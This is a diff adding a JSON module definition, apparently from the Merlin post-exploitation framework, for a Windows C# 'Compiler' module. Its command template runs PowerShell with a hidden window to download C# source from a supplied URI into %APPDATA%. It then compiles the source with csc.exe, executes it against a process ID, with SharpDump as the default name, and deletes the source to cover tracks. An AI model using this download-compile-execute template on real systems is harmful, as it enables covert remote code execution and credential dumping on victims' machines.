@@ -1,0 +1,35 @@
+{
+  "base": {
+    "name": "Compiler(CSharp)",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": [],
+    "path": ["windows", "x64", "csharp", "misc", "Compiler-CSharp.json"],
+    "platform": "windows",
+    "arch": "x64",
+    "lang": "csharp",
+    "privilege": false,
+    "remote": "",
+    "local": [],
+    "options": [
+      {"name": ".NetVersion", "value": "v4.*", "required": true, "flag": "", "description":"The .Net Framework version compiler to use (i.e. v3.0, v3.5, or v4.*)"},
+      {"name": "FileName", "value": "SharpDump", "required": true, "flag": "", "description":"The filename, without the file extension, used for the resulting source code and compiled files"},
+      {"name": "OutLocation", "value": "$env:APPDATA", "required": true, "flag": "", "description": "The working directory for the files"},
+      {"name": "URI", "value": "", "required": true, "flag": "", "description":"The URI for the location of the source code"}
+    ],
+    "description": "This module uses PowerShell to download a self-contained C# source code, compile it, execute it, and delete it",
+    "notes": "",
+    "commands": [
+      "powershell.exe",
+      "-nop",
+      "-w 1",
+      "\"",
+      "(New-Object System.Net.WebClient).DownloadFile('{{URI.Value}}', {{OutLocation.Value}}+'\\\\{{FileName.Value}}.cs');",
+      "c:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\{{.NetVersion.Value}}\\\\csc.exe /unsafe /out:{{OutLocation.Value}}\\\\{{FileName.Value}}.exe {{OutLocation.Value}}\\\\{{FileName.Value}}.cs;",
+      "&{{OutLocation.Value}}\\\\{{FileName.Value}}.exe",
+      "{{ProcessID.Value}}",
+      ";del {{OutLocation.Value}}\\\\{{FileName.Value}}.cs",
+      "\""
+    ]
+  }
+}
